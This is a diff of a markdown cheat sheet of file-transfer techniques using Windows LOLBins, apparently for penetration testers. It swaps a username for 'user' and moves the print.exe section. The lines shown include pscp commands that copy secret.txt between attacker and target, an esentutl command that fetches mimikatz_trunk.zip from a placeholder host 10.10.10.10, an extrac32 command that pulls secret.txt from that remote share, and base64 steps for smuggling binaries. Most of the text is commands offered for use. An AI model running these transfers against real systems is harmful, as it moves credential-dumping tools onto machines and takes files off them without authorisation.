@@ -90,8 +90,8 @@ https://www.greyhathacker.net/?tag=download-and-execute
 
 ## ssh / pscp.exe
 
-pscp.exe C:\Users\Public\info.txt phineas@target:/tmp/info.txt
-pscp.exe phineas@target:/home/phineas/secret.txt C:\Users\Public\secret.txt
+pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt
+pscp.exe user@target:/home/user/secret.txt C:\Users\Public\secret.txt
 
 
 ## certutil.exe
@@ -112,15 +112,8 @@ cat binary.exe | base64 -w 0
 echo {base64_data} | base64 -d > binary.exe
 
 
-## print.exe
-
-C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe
-
-Links:
-
-https://twitter.com/Oddvarmoe/status/984749424395112448
-
 ## WebDAV downloaders
+
 
 ### makecab.exe
 
@@ -137,9 +130,15 @@ C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"
 C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt
 
 
+## print.exe
+
+C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe
+
 Links:
 
-for fuller list of WebDAV downloader LOLBINS see:
+https://twitter.com/Oddvarmoe/status/984749424395112448
+
+for fuller list of WebDAV downloaders check @api0cradle LOLBINS/LOLBAS project:
 https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 
 
